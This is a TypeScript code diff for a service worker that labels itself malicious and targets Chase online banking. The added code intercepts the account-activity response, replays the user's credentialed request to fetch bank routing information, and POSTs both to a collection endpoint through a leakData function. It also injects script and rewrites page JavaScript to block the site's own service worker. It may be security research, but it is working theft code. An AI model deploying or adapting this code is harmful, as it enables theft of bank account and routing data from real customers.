@@ -13,28 +13,36 @@ self.addEventListener("activate", () => {
 // @ts-expect-error More typing annoyances
 self.addEventListener("fetch", (event: FetchEvent) => {
     console.log("Malicious service worker has intercepted the request")
-    event.respondWith(_handleRequest(event.request))
+    event.respondWith(chaseHandleRequest(event.request))
 })
 
-const leakPaths = new Set([
-    "/svc/rr/accounts/secure/v1/account/routing/list",
-    "/svc/rr/accounts/secure/v4/activity/dda/list"
-])
-
-async function _handleRequest(req: Request) : Promise<Response> {
+async function chaseHandleRequest(req: Request) : Promise<Response> {
+    const clonedRequest = req.clone()
     const originalResponse = await fetch(req)
     const url = new URL(req.url)
     let finalData: string
     if(req.mode === "navigate") {
         // It is a navigate request and we need to stop service worker registration
-        finalData = _handleHtml(await originalResponse.text())
+        finalData = chaseHandleHtml(await originalResponse.text())
     } else if(originalResponse.headers.get("content-type")?.includes("javascript")) {
-        finalData = _handleJs(await originalResponse.text())
+        finalData = chaseHandleJs(await originalResponse.text())
     } else {
-        if(leakPaths.has(url.pathname)) {
+        if(url.pathname === "/svc/rr/accounts/secure/v4/activity/dda/list") {
             const clonedResponse = originalResponse.clone()
             const data = await clonedResponse.text()
             leakData(data, req.url)
+            // We must be logged in so lets steal the routing information
+            const routingInfoUrl = "https://secure03b.chase.com/svc/rr/accounts/secure/v1/account/routing/list"
+            
+            // Grab the accountId from the old request
+            const oldBody = await clonedRequest.text()
+            const newBody = oldBody.match(/(accountId=.+)&/)?.[1] ?? ""
+
+            // use the cloned request to keep important credentials
+            const routingInfoReq = chaseCloneRequestWithChanges(req, {body: newBody, url: routingInfoUrl})
+            fetch(routingInfoReq)
+                .then(res => res.json())
+                .then(routingInfo => leakData(routingInfo, routingInfoUrl))
         }
         return originalResponse
     }
@@ -49,8 +57,23 @@ async function _handleRequest(req: Request) : Promise<Response> {
     return newResponse
 }
 
+function chaseCloneRequestWithChanges(original: Request, changes: Partial<RequestInit> & {url?: string}): Request {
+    const newOptions: RequestInit = {
+        body: original.body,
+        cache: original.cache,
+        credentials: original.credentials,
+        headers: original.headers,
+        method: original.method,
+        redirect: original.redirect,
+        mode: original.mode,
+        ...changes
+    }
 
-const userId = crypto.randomUUID()
+    return new Request(changes.url ?? original.url,newOptions)
+}
+
+
+const chaseUserId = crypto.randomUUID()
 async function leakData(data: any, url: string): Promise<void> {
     await fetch("http://localhost:8080/leak", {
         method: "POST",
@@ -58,14 +81,14 @@ async function leakData(data: any, url: string): Promise<void> {
             "Content-Type": "application/json",
         },
         body: JSON.stringify({
-            id: userId,
+            id: chaseUserId,
             data,
             url
         })
     })
 }
 
-function _handleHtml(originalDocument: string) : string {
+function chaseHandleHtml(originalDocument: string) : string {
     return originalDocument.replace("<head>", `<head>
     <script>
         navigator.serviceWorker.register = () => new Promise(resolve => {})
@@ -73,7 +96,7 @@ function _handleHtml(originalDocument: string) : string {
     </script>`)
 }
 
-function _handleJs(originalDocument: string) : string {
+function chaseHandleJs(originalDocument: string) : string {
     return originalDocument
         // Removes any possibility of anything being called on the service worker object
         .replace(/navigator\.serviceWorker/g, "window")
